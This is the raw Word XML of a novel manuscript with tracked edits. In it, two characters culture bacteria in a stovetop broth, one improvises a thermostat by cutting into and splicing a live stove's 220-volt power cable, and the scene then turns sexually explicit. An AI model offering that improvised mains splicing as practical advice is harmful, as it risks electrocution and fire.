          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Tina shut off the tap</w:t>
      </w:r>
      <w:r w:rsidR="00184B69">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00184B69">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">ilence </w:t>
      </w:r>
      <w:r w:rsidR="00F95985">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r w:rsidR="00F95985">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>d the house. She stood motionless for a moment, her hand frozen on the water knob.</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w:t>
      </w:r>
      <w:r w:rsidR="00414367">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>peered</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> nervously </w:t>
      </w:r>
      <w:r w:rsidR="00414367">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>into</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the pot.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broke the stillness with a sharp inhal</w:t>
      </w:r>
      <w:ins w:id="2283" w:author="TextVet" w:date="2016-03-22T15:40:00Z">
        <w:r w:rsidR="00382BE8">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ation</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2284" w:author="TextVet" w:date="2016-03-22T15:40:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00382BE8">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“Okay, then.” She closed its lid, carried it to the stove, and loaded it into the oven.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the water busy heating, Danny grabbed a seat at the counter. “What happens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“After the water boils, I’ll turn down the heat and let it simmer.” Tina came around and sat down beside him. “A real autoclave would suck out all the air and then blast it with pressurized steam for twenty minutes. But what we’re doing should be good enough.”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then it’ll be sterile?”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She shook her head. “Not by a long shot. ‘Sterile’ literally means there’s nothing alive. There’s no way we’ll achieve that. The air, the water, the inside of the pot, it’s all teeming with life.”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the water’s clean. It just came out of the sink.”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“Heh. Try looking at tap water under a microscope sometime,” Tina replied. “The hardest part will come afterwards. See, when we take the broth out of the oven, we’ll need to cool it down just the right amount. If we put the bacteria in when the water’s still boiling, it’ll kill them. But if we let it cool all the way down to room temperature, they won’t grow. We need to find a way to keep the broth just warm enough for incubation.”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“And how warm is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walked over to the bags and pulled out the digital thermometer. “Body temperature</w:t>
      </w:r>
      <w:ins w:id="2285" w:author="TextVet" w:date="2016-03-22T15:46:00Z">
        <w:r w:rsidR="0069298C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>:</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2286" w:author="TextVet" w:date="2016-03-22T15:46:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0069298C">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287" w:author="TextVet" w:date="2016-03-22T15:46:00Z">
        <w:r w:rsidR="0069298C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>n</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2288" w:author="TextVet" w:date="2016-03-22T15:46:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0069298C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>N</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>inety-eight point six. But keeping it there will be tricky. An electric stove’s lowest setting is around 200. We’d have to keep the pot on your range, and take shifts checking the thermometer, turning the heat on and off every few minutes. Unless you’ve got any other suggestions.”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“Build a nest and sit on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laughed. “That would get the job done.”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“I’ll bring you worms, and distract predators with my colorful feathers.” After a moment of thought, he reached toward her and made grabby motions with his bandaged hand. “Let me see that thermometer…” He examined the small device. Through its translucent plastic shell, he could see a narrow green circuit</w:t>
      </w:r>
      <w:ins w:id="2289" w:author="TextVet" w:date="2016-03-22T15:48:00Z">
        <w:r w:rsidR="00B53F3D">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board behind the temperature readout screen. Danny hopped down from his stool and staggered toward his foyer.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“Ooh! You have a plan, don’t you?” Tina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walked mechanically to the door leading out to his garage. Circuit schematics materialized in his head. In his mind’s eye appeared fine gray rectilinear diagrams of transistors, power supplies, crossovers… It was child’s play.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By the time Tina followed, he was already seated at his workbench</w:t>
      </w:r>
      <w:ins w:id="2290" w:author="TextVet" w:date="2016-03-22T15:49:00Z">
        <w:r w:rsidR="009F1986">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2291" w:author="TextVet" w:date="2016-03-22T15:49:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="009F1986">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292" w:author="TextVet" w:date="2016-03-22T15:49:00Z">
        <w:r w:rsidR="009F1986">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>t</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2293" w:author="TextVet" w:date="2016-03-22T15:49:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="009F1986">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 xml:space="preserve">he thermometer </w:t>
      </w:r>
      <w:ins w:id="2294" w:author="TextVet" w:date="2016-03-22T15:50:00Z">
        <w:r w:rsidR="009F1986">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>vise-</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2295" w:author="TextVet" w:date="2016-03-22T15:50:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="009F1986">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">was </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">clamped </w:t>
      </w:r>
      <w:del w:id="2296" w:author="TextVet" w:date="2016-03-22T15:50:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="009F1986">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">into a vise </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>beneath a table-mounted magnifying glass. He was slicing its translucent plastic shell with an X-ACTO knife.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commentRangeStart w:id="2297"/>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Can</w:t>
      </w:r>
      <w:commentRangeEnd w:id="2297"/>
      <w:r w:rsidR="005055EA">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="2297"/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> I watch?” she asked, and leaned over his shoulder.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gently tapped the metal bulb at the tip of the thermometer with his blade. “See that? That’s the casing for a little thing called a ‘thermistor…’”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thermometer’s shell split in half beneath his knife. The narrow end dangled by two thin orange wires, </w:t>
      </w:r>
      <w:ins w:id="2298" w:author="TextVet" w:date="2016-03-22T15:57:00Z">
        <w:r w:rsidR="00723737">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">each </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">barely as thick as a hair. Working </w:t>
      </w:r>
      <w:ins w:id="2299" w:author="TextVet" w:date="2016-03-22T15:58:00Z">
        <w:r w:rsidR="00723737">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>deft</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2300" w:author="TextVet" w:date="2016-03-22T15:58:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00723737">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>careful</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ly under the magnifying glass, he severed the two wires, worked on their naked tips with a soldering iron, and attached them to extensions several feet long.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 that the temperature sensor?” asked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“Basically, yeah,” said Danny. “It’s made of temperature-sensitive ceramic. The warmer it gets, the more it impedes the flow of electricity. Thermal resistor, see? Here, hold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passed her the severed bottom of the thermometer. When she took it delicately in her fingers, he pressed it into her palm. “No, like this…” He put his hands around hers and folded it around the sensor. “Warm it up…” He noticed himself lingering on her touch. Their eyes met.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said with a smile, “You know, it won’t reach body temperature in my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won’t?” Danny asked quietly.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chance,” she said. “It’s an oral thermometer.”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he murmured.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Their eyes still locked, she drew her hand away from his and turned the thermometer around in her fingers. Her lips parted. She slid it into her mouth, nestling the tip in the space beneath her tongue.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Once he remembered to breathe again, Danny </w:t>
      </w:r>
      <w:ins w:id="2301" w:author="TextVet" w:date="2016-03-22T16:01:00Z">
        <w:r w:rsidR="004720FA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>shot</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2302" w:author="TextVet" w:date="2016-03-22T16:01:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004720FA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>abruptly stood</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> up from the workbench and turned away. He stepped to a case of narrow shelves, each bearing plastic bins filled with assorted electronic components. “So anyway… It won’t need much… One transistor… A switching power supply… MOSFET… Relay… A rheostat for calibration…” He returned to the workbench with a handful of black and silver objects. </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>He selected a breadboard, an index-card-sized rectangle of white plastic dotted with a grid of hundreds of tiny holes. Into two of the countless sockets, he inserted the loose ends of the long wires soldered to the thermistor, still hanging from Tina’s mouth as she stood there blinking. He then began drawing pieces from his pile of components and adding them to the breadboard.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looked on. “Sho, umm… What’sh shish shing</w:t>
      </w:r>
      <w:ins w:id="2303" w:author="TextVet" w:date="2016-03-22T16:02:00Z">
        <w:r w:rsidR="00372982">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shupposhed to do?”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 thermostat. Watch. See this LED?” He pointed to a small glass bead.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“Mm-hmm,” Tina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“Pretend that’s a burner on my stove. Now, I’ve tuned the thermostat to your body heat. When the thermometer is at body temperature or higher, it’s turned off. But if it cools down…”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reached toward her face. She puckered her lips. He pulled the dismantled thermometer from her mouth, possibly more slowly than necessary, and shook the moist tip through the air. The glass bead popped aglow with a bright green light.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 “So if you put the thermometer tip inside the pot, then it can turn the burner on and off automatically. Which will keep the broth at a steady temperature without us having to keep a vigil on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“Bingo. Of course, I’ll seal the whole thing in epoxy resin to make it watertight, so the electronics won’t short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raised an eyebrow. “How’ll you connect this to your stove?”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this…!” Danny replied excitedly. He held up a blue plastic cube the size of his palm, studded with thick, stubby prongs. It looked similar to the ones on the back of the HERF gun that sat sipping power in the corner. “This is a power relay,” he explained as he attached wires between the breadboard and the cube. “It can switch ten amps of 220VAC on a two-amp 12VDC control current.”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shrugged uncomprehendingly, but her eyes were gleaming. “I have to go check on the broth. Meet you in the kitchen?” He nodded, and she skipped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By the time Danny finished his makeshift thermostat, Tina had already taken the pot out of the oven. The kitchen sink was plugged and filled with a watery slurry of ice </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>from the freezer. Tina held the hot vessel with oven mitts and gently rocked it in the ice bath.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entered the kitchen wearing thick electrical gloves. He walked up to the stove and pulled. The stove slid out, scraping against the floor tiles, just far enough to expose the black cord that plugged it into the house’s 220VAC circuit. He pulled the plug out of the wall. The stove’s clock went dead. He then produced his X-ACTO knife and slashed open the stove’s power cable, sliding the blade slowly down the rubber insulation until he had formed a slit almost a foot long. Multicolored wires and metallic coating protruded from the gash.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 that safe?” Tina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 in the slightest.” He severed and stripped one of the exposed wires, and spliced its ends with the power relay/ Gingerly, he plugged the appliance back into the wall. Much to his relief, nothing caught fire. The stove came back to life, its clock blinking 00:00.</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 bad,” Tina said with a smirk. She lifted the two-gallon pot, and carried it to the stove.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took off his electrical gloves and offered her the thermometer. “Shall we?”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nodded, and with a deft, quick motion, she slid the lid aside just barely widely enough to accommodate Danny’s device. A warm, salty, sweet scent rose from the pot, organic yet pure. The thermometer made a soft plop as it entered the broth. Its wires protruded from the rim, preventing the lid from closing completely. Tina applied a generous coat of Saran Wrap to form an approximately airtight seal.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power relay emitted a loud “</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Click!</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>”, and the stove’s power cut out. Its clock showed a dead black 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“The burner was on, right? So it was heating this whole time. Which means it’s supposed to turn off now to cool down a little. And then when it’s cool enough it’ll turn back on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all that’s left,” said Tina, “is the…”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both turned their heads and stared at the white latex glove on the granite counter, inside-out, twisted and tied off.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Tina picked it up. She held one of the glove’s fingers pinched shut, and with a pair of scissors she cut the finger away. “You ready?”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whispered thickly, “Let’s do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inhaled sharply and held her breath, her breasts stretching her white button-down shirt.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peeled back the plastic wrap and pushed the lid aside barely an inch, leaving a narrow crescent of broth momentarily exposed. With both gloved hands, she gently tapped the latex finger. The lone yellowish-white grain tumbled out. It alighted on the water’s surface like a flake of fish food.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rapidly closed the cover and re-wrapped the plastic. She peeled off her gloves, and finally let herself exhale.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stood beside her, both of them looking down at the two-gallon stainless steel pot. “What happens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“Nothing,” Tina answered.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 wait for them to multiply,” Tina replied. She flexed her fingers, her black nail polish giving off a hint of iridescence as it caught the light. “They’ll fill the whole pot eventually.”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long will that take?”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shrugged. “Depends on how well I prepped that broth. Maybe hours. Maybe a couple of days. Maybe weeks. It’s a big pot.”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“Hrmm. This thing could be on my stove for a couple of weeks?”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“Yep,” she said, turning to face him with a mischievous gaze.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said Danny, his eyes fixed on hers. “What’s left for us to do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full, pink lips were stretched in an elfish smile. “I don’t know. You tell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Beside the stove, the power relay brought the burner back to life with a loud, “</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Click!</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His hand shot toward her waist. He pulled her toward him and slid his other hand along the back of her head, his fingers running through that dark unkempt hair that he </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>had wanted to touch since first seeing her on that hacked video feed earlier that night. His lips crashed upon hers like waves against a shore.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didn’t think about brushing his tongue lightly against hers. He didn’t think about leading into a nibble of the lower lip. He didn’t think; he didn’t calculate or analyze or hypothesize. He simply did.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squeezed her body against his, her breasts pressing against his ribs and her hips pushing against his pelvis. She could undoubtedly feel his desire for her. Her arms reached around him and her fingers splayed against his back, drawing him tightly to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pressure of her hand hit his injured shoulder. A flash of searing pain jolted him out of the kiss. He pulled back and hissed harshly, his eyes wide and his senses suddenly heightened. The wound throbbed with his quickening pulse.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drew her hands away and looked up at him apologetically.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eyes gazed into hers with raw animal hunger. He grinned.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a shove, he thrust her away from the stove with carefully guided force. Her back hit the refrigerator.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grabbed her dark hair and pulled her head to one side, exposing her neckline, and pressed his mouth vigorously against the side of her neck. His other hand cupped over her shirt and bra and massaged her breast.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moaned deliciously into his ear. Her hand was in his hair, pulling his head down to increase the pressure on her neck, craving more. She raised one knee, her shoe against the refrigerator door, her thigh rubbing against his waist. Her hips ground against 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his mouth worked its way down from her ear to her collar, his hand began unbuttoning her white shirt.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ran her hand under his pajama shirt, her fingers tracing the contours of the muscles of his torso.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Her last button undone, Danny stepped back to admire the sight of this lithe young lady against his fridge, her white shirt hanging open and exposing her tan bra and toned midsection. He took a moment to consume her curving feminine form with his eyes as </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>she remained pressed with her back against the fridge. Tina smirked libidinously for a moment, wiggling teasingly against the fridge, happy to let him enjoy the view.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then kicked herself away from the fridge and reached out to grab him and yank him back to her by his pajama shirt, which she promptly pulled off </w:t>
      </w:r>
      <w:del w:id="2304" w:author="TextVet" w:date="2016-03-22T16:15:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00007D15">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">of </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>him. She flung it to the kitchen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both hands, he pulled her shirt off behind her, leaving the sleeves bunched at her wrists. She began to wriggle her hands to slide entirely free… but he didn’t want her to. Instead, he twisted the shirt tightly, trapping her hands behind her in its white fabric. Putting his other hand on her shoulder, he spun her around and pushed her against the fridge once more, pinning her face and chest against its door. While his one hand maintained the squeeze on the shirt bunched around her wrists to keep her hands immobile, his other deftly unhooked her bra, his agile fingers making quick work of the clasps.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At last</w:t>
      </w:r>
      <w:ins w:id="2305" w:author="TextVet" w:date="2016-03-22T16:17:00Z">
        <w:r w:rsidR="00F4490E">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he released her wrists, tossing her white shirt mindlessly aside and dropping her </w:t>
      </w:r>
      <w:del w:id="2306" w:author="TextVet" w:date="2016-03-22T16:17:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00FB45A8">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">tan </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>bra to the floor. With his body</w:t>
      </w:r>
      <w:ins w:id="2307" w:author="TextVet" w:date="2016-03-22T16:18:00Z">
        <w:r w:rsidR="007B53D5">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he kept her pinned against the refrigerator door, his naked torso pressing hungrily against the warm, supple skin of her back. She pressed one of her newly freed arms against the refrigerator, the palm flat against the door. The other reached up and back, her black-painted fingers clutching his head.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arms wrapped around to her front. One hand climbed upward to massage and caress her naked breast, molding around its soft round form. He gently pinched her nipple between two fingers, eliciting moans of delight from her parted lips.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other hand reached around the curve of her hip and climbed downward, past her abdomen, past her navel. He unthreaded her belt from its loops. Pulled it away from the buckle. Slid it open, letting its leather ends dangle aside. Nimbly unbuttoned her black slacks. Drew down the zipper. He took his time, enjoying hearing her gasp.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E10DF0" w:rsidRDefault="000D3488" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:ins w:id="2308" w:author="TextVet" w:date="2016-03-23T14:34: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His fingers first stroked teasingly outside her panties, indulging in the slickness of her hot, moist passion. He kept his </w:t>
      </w:r>
      <w:commentRangeStart w:id="2309"/>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ministrations</w:t>
      </w:r>
      <w:commentRangeEnd w:id="2309"/>
      <w:r w:rsidR="007B53D5">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="2309"/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> on the outside of the thin fabric until her face contorted in agony</w:t>
      </w:r>
